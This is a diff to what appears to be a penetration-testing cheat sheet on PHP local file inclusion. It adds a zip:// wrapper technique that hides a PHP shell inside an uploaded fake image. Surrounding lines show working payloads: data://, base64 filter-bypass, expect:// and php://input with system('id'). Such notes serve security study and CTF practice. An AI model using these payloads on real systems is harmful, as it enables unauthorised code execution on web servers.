@@ -16,6 +16,7 @@ tags:
 > | `data://` | Inline code exec | `?page=data://text/plain,<?php system('id');?>` |
 > | `data://` base64 | Bypass filters | `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` |
 > | `expect://` | Direct RCE | `?page=expect://id` (rarely enabled) |
+> | `zip://` | RCE via uploaded archive | `?page=zip://uploads/shell.jpg%23shell.php` (needs a file-upload vector too) |
 
 ## Decision Tree
 
@@ -34,6 +35,12 @@ LFI confirmed but no logs accessible?
 │   ├── allow_url_include=On needed
 │   ├── curl -X POST "http://<IP>/?page=php://input" --data "<?php system('id');?>"
 │   └── Works if POST body is executed
+│
+├── Also have a file upload form?
+│   ├── zip up shell.php as shell.jpg: zip shell.jpg shell.php
+│   ├── upload it, then include:
+│   │   └── ?page=zip://<path-to-uploaded-file>%23shell.php
+│   └── the %23 (URL-encoded #) is required — PHP treats a literal # as a URI fragment and drops it
 │
 └── Nothing works?
     └── Fall back to log poisoning or RFI
@@ -62,6 +69,7 @@ flowchart TD
 > - `php://filter` returns the rendered page, not base64 → you forgot `convert.base64-encode/`; add it before `resource=`.
 > - `data://` does nothing → `allow_url_include` must be `On`; it is off by default, so fall back to log poisoning or RFI.
 > - Filter blocks `system` or `<?php` → base64-encode the whole snippet and use `;base64,` form. See [[🔣 Encoding Reference]].
+> - `zip://` returns nothing or a raw archive listing → the `#` before the internal filename must be URL-encoded as `%23`, or PHP truncates the path at the fragment marker before it ever reaches the wrapper.
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
 
 > [!tip] Beginner note
